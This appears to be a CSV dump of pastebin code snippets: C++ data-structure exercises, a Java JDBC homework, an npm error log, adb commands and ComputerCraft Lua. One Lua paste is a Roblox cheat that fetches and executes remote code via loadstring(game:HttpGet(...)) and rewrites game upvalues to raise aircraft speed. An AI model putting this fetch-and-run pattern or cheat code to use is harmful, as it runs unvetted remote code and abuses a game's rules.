id,title,username,language,date,content
y9LLjYVk,Untitled,Salvens,C++,Friday 16th of June 2023 08:35:36 AM CDT,"#include <algorithm>
#include <iostream>
#include <iomanip>
#include <cmath>
#include <vector>
#include <set>
//#include <map>
//#include <string>
//#include <cassert>
//#include <numeric>
//#include <queue>
//#include <cstdint>
using namespace std;

//#define int long long
#define IOS ios::sync_with_stdio(false); cin.tie(0); cout.tie(0);

const long long INF = 1e18 + 7;
const double EPS = 1e-9;
const int N = 110;
const int MOD = 1e9 + 7;

struct segtree {

    vector<long long> tree;
    int size;

    const int NO_OPERATION = -INF;

    void Init(int n) {
        size = 1;
        while (size < n) {
            size *= 2;
        }
//        tree.assign(2 * size - 1, 0);
        tree.resize(2 * size -1, 0);
        fill(tree.begin(), tree.end(), 0);
    }

    void propagate(int x, int lx, int rx) {
        if (tree[x] == NO_OPERATION) {
            return;
        }
        if (rx - lx == 1) {
            return;
        }
        tree[2 * x + 1] = tree[x];
        tree[2 * x + 2] = tree[x];
        tree[x] = NO_OPERATION;
    }

    void modify(int l, int r, int v, int x, int lx, int rx) {
        propagate(x, lx, rx);
        if (l >= rx || lx >= r) {
            return;
        }
        if (lx >= l && rx <= r) {
            tree[x] = v;
            return;
        }
        int m = (lx + rx) / 2;
        modify(l, r, v, 2 * x + 1, lx, m);
        modify(l, r, v, 2 * x + 2, m, rx);
    }

    void modify(int l, int r, int v) {
        modify(l, r, v, 0, 0, size);
    }

    long long get(int i, int x, int lx, int rx) {
        propagate(x, lx, rx);
        if (rx - lx == 1) {
            return tree[x];
        }
        int m = (lx + rx) / 2;
        if (i < m) {
            return get(i, 2 * x + 1, lx, m);
        } else {
            return get(i, 2 * x + 2, m, rx);
        }
    }

    long long get(int i) {
        return get(i, 0, 0, size);
    }

};

/*inline*/ void solve() {
    int n, m;
    cin >> n >> m;
    vector<int> a(m * 2 + 1), c(2 * m + 1);
    cin >> a[1] >> a[2] >> c[1];
    int x, y, z;
    cin >> x >> y >> z;
    c[2] = (c[1] * x + z * y) % n + 1;
    for (int i = 3; i <= m * 2; ++i) {
        a[i] = (x * a[i - 2] + y * a[i - 1] + z) % n + 1;
        c[i] = (c[i - 1] * x + z * y) % n + 1;
    }

    segtree st;
    st.Init(n);
    for (int i = 1; i <= m; ++i) {
        int l = min(a[2 * i - 1], a[2 * i]), r = max(a[2 * i - 1], a[2 * i]), v = c[i];
        st.modify(l - 1, r, v);
    }
    for (int i = 0; i < n; ++i) {
        cout << st.get(i) << ' ';
    }
    cout << '\n';
}

int32_t main() {
    IOS;

    int tt = 1;
//    cin >> tt;
    while (tt--) {
        solve();
    }
    return 0;
}

/*
1.  数组开够了没
2.  文件名写对了没，文件夹建了吗
3.  内存会不会MLE
4.  多测清空？
5.  调试删干净了没
6.  取模有没有溢出
7.  快速幂底数要取模，幂对 mod-1 取模
8.  前向星和欧拉序要开2倍数组
9.  比较函数如果值相同的话有没有第二优先级
10. 线段树 4 倍空间，线段树合并和可持久化线段树 32 倍空间
11. 看清楚 log 的底数是啥，log后面的数是啥
12. long long 只有正负 2^63-1
*/"
WbMVVMfA,startup.lua,kineticcat_,Lua,Friday 16th of June 2023 08:20:58 AM CDT,"global ws err = http.websocket(""176.249.156.217"")

if err then
    print(err)
elseif ws then
    print(ws.recive())"
uV0zNjd4,Untitled,Lyubov,Bash,Friday 16th of June 2023 08:01:49 AM CDT,"npm ERR! code ERESOLVE
npm ERR! ERESOLVE could not resolve
npm ERR!
npm ERR! While resolving: dagre-d3-react@0.2.4
npm ERR! Found: react@17.0.2
npm ERR! node_modules/react
npm ERR!   react@""^17.0.2"" from the root project
npm ERR!   peer react@""^16.8.0 || ^17.0.0"" from @material-ui/core@4.11.4
npm ERR!   node_modules/@material-ui/core
npm ERR!     @material-ui/core@""^4.11.4"" from the root project
npm ERR!     peer @material-ui/core@""^4.0.0"" from @material-ui/icons@4.11.2
npm ERR!     node_modules/@material-ui/icons
npm ERR!       @material-ui/icons@""^4.11.2"" from the root project
npm ERR!   16 more (@material-ui/icons, @material-ui/styles, ...)
npm ERR!
npm ERR! Could not resolve dependency:
npm ERR! peer react@""16.9.0"" from dagre-d3-react@0.2.4
npm ERR! node_modules/dagre-d3-react
npm ERR!   dagre-d3-react@""^0.2.4"" from the root project
npm ERR!
npm ERR! Conflicting peer dependency: react@16.9.0
npm ERR! node_modules/react
npm ERR!   peer react@""16.9.0"" from dagre-d3-react@0.2.4
npm ERR!   node_modules/dagre-d3-react
npm ERR!     dagre-d3-react@""^0.2.4"" from the root project
npm ERR!
npm ERR! Fix the upstream dependency conflict, or retry
npm ERR! this command with --force or --legacy-peer-deps
npm ERR! to accept an incorrect (and potentially broken) dependency resolution.
npm ERR!
npm ERR!
npm ERR! For a full report see:
npm ERR! C:\Users\admin\AppData\Local\npm-cache\_logs\2023-06-16T12_53_36_606Z-eresolve-report.txt

npm ERR! A complete log of this run can be found in:
npm ERR!     C:\Users\admin\AppData\Local\npm-cache\_logs\2023-06-16T12_53_36_606Z-debug-0.log"
YbVniPqS,Disable system settings for user on Android through ADB,metalx1000,Bash,Friday 16th of June 2023 07:54:49 AM CDT,"#get package name - run this command and start app
logcat|grep cmp

#diable system settings for user
pm disable-user com.android.settings

#enable system settings
pm enable com.android.settings"
yUpB7bsF,yes,Tumppi68,Lua,Friday 16th of June 2023 07:49:34 AM CDT,"--Made by tupsutumppu#3145
local DiscordLib = loadstring(game:HttpGet(""https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt""))()
local win = DiscordLib:Window(""PTFS Plane Speed Modifier"")
local serv = win:Server(""super op script"", """")
local maxSpeedChannel = serv:Channel(""Max Speed"")
local accelerationChannel = serv:Channel(""Acceleration"")

local settings = {
    maxSpeed = nil,
    acceleration = nil
}

local function mod(target, value)
    for _, v in pairs(getgc()) do
        if type(v) == ""function"" and tostring(getfenv(v).script) == ""Control"" then
            local upvalues = debug.getupvalues(v)
            for i, upvalue in pairs(upvalues) do
                if upvalue == target then
                    debug.setupvalue(v, i, value)
                    local str = ""Original value: "" .. tostring(target) .. "" | New Value: "" .. tostring(value)
                    DiscordLib:Notification(""Success!"" ,str, ""Close"")
                end
            end
            break
        end
    end
end

maxSpeedChannel:Textbox(""MaxSpeed"", ""Type here!"", true, function(text)
    settings.maxSpeed = tonumber(text) or settings.maxSpeed
end)

maxSpeedChannel:Button(""Apply New MaxSpeed"", function()
    if settings.maxSpeed ~= nil then
        local seatPart = game.Players.LocalPlayer.Character.Humanoid.SeatPart
        if seatPart then
            local fullName = seatPart:GetFullName()
            local secondName = fullName:split(""."")[3]
            local maxSpeedValue = game.Workspace.Aircraft[tostring(secondName)]:GetAttribute(""MaxSpeed"")
            mod(maxSpeedValue, settings.maxSpeed)
        else
            DiscordLib:Notification(""Notification"", ""Must be in a plane!"", ""Close"")
        end
    else
        DiscordLib:Notification(""Notification"", ""MaxSpeed cannot be 'nil'. Did you forget to press 'Enter' after providing a value?"", ""Close"")
    end
end)

accelerationChannel:Textbox(""Acceleration"", ""Type here!"", true, function(text)
    settings.acceleration = tonumber(text) or settings.acceleration
end)

accelerationChannel:Button(""Apply New Acceleration"", function()
    if settings.acceleration ~= nil then
        local seatPart = game.Players.LocalPlayer.Character.Humanoid.SeatPart
        if seatPart then
            local fullName = seatPart:GetFullName()
            local secondName = fullName:split(""."")[3]
            local accelerationValue = game.Workspace.Aircraft[tostring(secondName)]:GetAttribute(""Acceleration"")
            mod(accelerationValue, settings.acceleration)
        else
            DiscordLib:Notification(""Notification"", ""Must be in a plane!"", ""Close"")
        end
    else
        DiscordLib:Notification(""Notification"", ""Acceleration cannot be 'nil'. Did you forget to press 'Enter' after providing a value?"", ""Close"")
    end
end)"
MgQFHnpe,Untitled,Merry123,Java,Friday 16th of June 2023 07:48:01 AM CDT,"package Exercises;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.Scanner;

public class AddMinion {
    private static Connection connection;
    public static void main(String[] args) throws SQLException {
         connection = Utils.getConnection();

        Scanner sc = new Scanner(System.in);

        String[] minionInfo = sc.nextLine().split(""\\s+"");
        String minionName = minionInfo[1];
        int minionAge = Integer.parseInt(minionInfo[2]);
        String minionTown = minionInfo[3];
        String villainName = sc.nextLine().split(""\\s+"")[1];


        addTownIfItDoesntExist(minionTown);
        addVillainIfItDoesntExist(villainName);
        addMinion(minionName, minionAge, minionTown);
        setVillainToMinion(minionName, villainName);

    }

    private static void setVillainToMinion(String minionName, String villainName) throws SQLException {
        PreparedStatement preparedStatement = connection
                .prepareStatement(""INSERT INTO minions_villains VALUES (?, ?);"");
        int minionId = getMinionId(minionName);
        int villainId = getVillainId(villainName);
        preparedStatement.setInt(1, minionId);
        preparedStatement.setInt(2, villainId);
        preparedStatement.executeUpdate();

        System.out.printf(""Successfully added %s to be minion of %s.%n"", minionName, villainName);
    }

    private static int getVillainId(String villainName) throws SQLException {
        PreparedStatement preparedStatement = connection
                .prepareStatement(""SELECT DISTINCT id FROM villains WHERE name = ?"");
        preparedStatement.setString(1, villainName);
        ResultSet resultSet = preparedStatement.executeQuery();

        resultSet.next();

        return resultSet.getInt(1);
    }

    private static int getMinionId(String minionName) throws SQLException {
        PreparedStatement preparedStatement = connection.prepareStatement(""SELECT DISTINCT id FROM minions WHERE name = ?"");
        preparedStatement.setString(1, minionName);
        ResultSet resultSet = preparedStatement.executeQuery();

        resultSet.next();
        return resultSet.getInt(1);
    }

    private static void addMinion(String minionName, int minionAge, String minionTown) throws SQLException {
        PreparedStatement addMinion = connection
                .prepareStatement(""INSERT INTO minions(name, age, town_id) VALUES(?, ?, ?)"");
        addMinion.setString(1, minionName);
        addMinion.setInt(2, minionAge);
        addMinion.setInt(3, getTownIdByName(minionTown));

        addMinion.executeUpdate();
    }

    private static int getTownIdByName(String minionTown) throws SQLException {
        PreparedStatement preparedStatement = connection
                .prepareStatement(""SELECT DISTINCT id FROM towns WHERE name = ?;"");

        preparedStatement.setString(1, minionTown);

        ResultSet resultSet = preparedStatement.executeQuery();

        resultSet.next();

        return resultSet.getInt(1);
    }

    private static void addVillainIfItDoesntExist(String villainName) throws SQLException {
        if (checkIfVillainExists(villainName)) {
            PreparedStatement addVillain = connection
                    .prepareStatement(""INSERT INTO villains(name, evilness_factor) VALUES(?, ?)"");
            addVillain.setString(1, villainName);
            addVillain.setString(2, ""evil"");

            addVillain.executeUpdate();

            System.out.printf(""Villain %s was added to the database.%n"", villainName);
        }
    }

    private static boolean checkIfVillainExists(String villainName) throws SQLException {
        PreparedStatement preparedStatement = connection
                .prepareStatement(""SELECT DISTINCT COUNT(*) FROM villains WHERE name = ?"");

        preparedStatement.setString(1, villainName);
        ResultSet resultSet = preparedStatement.executeQuery();

        resultSet.next();

        return resultSet.getInt(1) == 0;
    }

    private static void addTownIfItDoesntExist(String minionTown) throws SQLException {
        if (checkIfTownExists(minionTown)) {
            PreparedStatement preparedStatement = connection
                    .prepareStatement(""INSERT INTO towns(name) VALUES(?);"");
            preparedStatement.setString(1, minionTown);

            preparedStatement.executeUpdate();

            System.out.printf(""Town %s was added to the database.%n"", minionTown);
        }
    }

    private static boolean checkIfTownExists(String minionTown) throws SQLException {
        PreparedStatement preparedStatement = connection
                .prepareStatement(""SELECT DISTINCT COUNT(*) FROM towns WHERE name = ?"");

        preparedStatement.setString(1, minionTown);
        ResultSet resultSet = preparedStatement.executeQuery();

        resultSet.next();

        return resultSet.getInt(1) == 0;
    }
}"
uBJJVdKF,Open App Settings from adb shell,metalx1000,Bash,Friday 16th of June 2023 07:47:18 AM CDT,"#open App Settings from adb shell on Android

#example from adb shell
am start -a android.settings.APPLICATION_DETAILS_SETTINGS package:com.filmsbykris.game

#use fzf filter on desktop
adb shell am start -a android.settings.APPLICATION_DETAILS_SETTINGS ""$(adb shell pm list packages|fzf)"""
x382G361,Untitled,phpface,CSS,Friday 16th of June 2023 07:12:13 AM CDT,"@media only screen and (max-width: 768px) {
    .widget-videos-playlist .post-grid {
        min-height: 600px!important;
    }    
}"
BVT3kTis,CC:Tweaked Mob Farm,timconspicuous,Lua,Friday 16th of June 2023 07:11:43 AM CDT,"-- Monitor setup
local monitor = peripheral.wrap(""top"") -- Replace ""top"" with the side where your monitor is located
monitor.setTextScale(0.5) -- Adjust the text scale as needed

-- Button properties
local buttonX = 1 -- X-coordinate of the top-left corner of the button
local buttonY = 1 -- Y-coordinate of the top-left corner of the button
local buttonWidth = 10 -- Width of the button
local buttonHeight = 5 -- Height of the button

-- Button state
local isButtonOn = false -- Initial state of the button (red)

-- Function to draw the button
local function drawButton()
  monitor.setBackgroundColor(colors.red)
  monitor.clear()
  monitor.setCursorPos(buttonX, buttonY)
  monitor.setTextColor(colors.white)
  
  for i = 1, buttonHeight do
    monitor.setCursorPos(buttonX, buttonY + i - 1)
    monitor.write(string.rep("" "", buttonWidth))
  end
  
  monitor.setCursorPos(buttonX + math.floor((buttonWidth - 3) / 2), buttonY + math.floor((buttonHeight - 1) / 2))
  monitor.write(isButtonOn and ""ON"" or ""OFF"")
end

-- Function to toggle the button state and redstone signal
local function toggleButton()
  isButtonOn = not isButtonOn
  drawButton()
  
  -- Toggle redstone signal on the right side of the computer
  rs.setOutput(""right"", isButtonOn)
end

-- Main program loop
while true do
  local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")
  
  -- Check if the touch event occurred within the button boundaries
  if xPos >= buttonX and xPos <= buttonX + buttonWidth - 1 and yPos >= buttonY and yPos <= buttonY + buttonHeight - 1 then
    toggleButton()
  end
end
"
hpJZad51,login,rnsribeiro,JSON,Friday 16th of June 2023 06:56:32 AM CDT,"{
	""Status"":""OK""
}"
vgQrLqE7,Untitled,35657,C++,Friday 16th of June 2023 06:39:47 AM CDT,"#include <iostream>

using namespace std;




template <typename T>
class Stack {
public:
    void Push(const T& element) {
        elements_[size] = element;;
        size++;
    }
    void Pop() {
        size--;;
    }
    const T& Top() const {
        return elements_[size - 1];
    }
    T& Top() {
        return elements_[size - 1];
    }

    int Size() const {
        return size;
    }
    bool Empty() const {
        return size == 0;;
    }

private:
    T elements_[100];
    int size = 0;
};

int main() {
    Stack<int> stack;
    for (uint32_t i = 0; i < 10; ++i) {
        stack.Push(i);
        cout << stack.Top() << endl;
    }
    cout << endl;

    while (!stack.Empty()) {
        cout << stack.Top() << endl;
        stack.Pop();
    }
    cout << endl;
}"
iU4yHyKq,Network Router,openblocki,Lua,Friday 16th of June 2023 06:36:41 AM CDT,"-- Author : Mystical_MechGod aka. openblocki aka. Luc

local server_connection = peripheral.wrap(""back"")
local monitor = peripheral.wrap(""top"")

local y = 1


monitor.write(os.getComputerID)
rednet.open(""front"")

while true do

    local senderId, message, protocol = os.pullEvent(""rednet_message"")

    if message == ""Password"" then
        y= y + 1
        monitor.setCursorPos(1,y)
        monitor.write(senderId)
        server_connection.transmit(1,1,senderId)
        
    end
end"
6s0b9eiH,Untitled,35657,C++,Friday 16th of June 2023 06:36:25 AM CDT,"#include <iostream>

using namespace std;

template <typename T>
class ForwardList {
public:

    ForwardList() : size(0), head(nullptr) {}

    ForwardList(const ForwardList& other) : size(other.size), head(nullptr) {
        if (other.head != nullptr) {
            head = new Node{ other.head->value, nullptr };
            Node* temp = head;
            Node* other_temp = other.head;
            while (other_temp->next != nullptr) {
                other_temp = other_temp->next;
                temp->next = new Node{ other_temp->value, nullptr };
                temp = temp->next;
            }
        }
    }

    /*ForwardList(ForwardList& other) :size(0), head(nullptr) {
        while (size != other.size) {
            Node* temp = other.head;
            for (int i = 0; i != other.size - size - 1; i++) {
                temp = temp->next;
            }
            Push_front(temp->value);
        }
    };*/

    ForwardList(ForwardList&& other) : size(other.size), head(other.head) {
        other.size = 0;
        other.head = nullptr;
    }

    ForwardList& operator=(const ForwardList& other) {
        if (this != &other) {
            Clear();
            if (other.head != nullptr) {
                head = new Node{ other.head->value, nullptr };
                Node* temp = head;
                Node* other_temp = other.head;
                while (other_temp->next != nullptr) {
                    other_temp = other_temp->next;
                    temp->next = new Node{ other_temp->value, nullptr };
                    temp = temp->next;
                }
            }
            size = other.size;
        }
        return *this;
    }

    

    ForwardList& operator=(ForwardList&& other) {
        if (this != &other) {
            Clear();
            size = other.size;
            head = other.head;
            other.size = 0;
            other.head = nullptr;
        }
        return *this;
    }

    void Push_front(const T& value) {
        head = new Node{ value, head };
        size++;
    }

    void Pop_front() {
        if (size > 0) {
            Node* temp = head;
            head = head->next;
            delete temp;
            size--;
        }
    }

    void Print() {
        Node* temp = head;
        while (temp != nullptr) {
            cout << temp->value << "" "";
            temp = temp->next;
        }
        cout << endl;
    }

    int Size() const {
        return size;
    }

    T Front() const {
        if (head != nullptr) {
            return head->value;
        }
    }

    void Clear() {
        while (head != nullptr) {
            Pop_front();
        }
    }

    void Insert(const int index, const int& value) {
        if (index == 0) {
            Push_front(value);
            return;
        }
        if (index > 0 && index < size) {
            Node* temp = head;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            temp->next = new Node{ value, temp->next };
            size++;
        }
    }

    void Erase(const int index) {
        if (index == 0) {
            Pop_front();
            return;
        }
        if (index > 0 && index < size) {
            Node* temp = head;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            Node* buf = temp->next->next;
            delete temp->next;
            temp->next = buf;
            size--;
        }
    }

    ~ForwardList() {
        Clear();
    }

private:
    struct Node { //односвязный список состоит из узлов
        T value; // узел хранит информативную часть
        Node* next; // и указатель на следующий узел в списке
    };
    int size = 0;
    Node* head = nullptr;
};

        // реализовать функцию Clear (очистка списка), конструктор по умолчанию, деструктор

int main() {
    ForwardList<int> list1;

    for (int i = 0; i < 10; i++) {
        list1.Push_front(i + 1);
        list1.Print();
    }

    cout << list1.Size() << endl;

    for (int i = 0; i < 3; i++) {
        list1.Pop_front();
        list1.Print();
    }

    list1.Insert(2, 12);

    list1.Print();


    list1.Erase(3);

    list1.Print();

    cout << list1.Size() << endl;

    cout << list1.Front() << endl;

    ForwardList<int> list2;
    
    list2 = move(list1);

    cout << ""list2:"" << endl;

    list2.Print();

    cout << ""list1:"" << endl;

    list1.Print();
}"
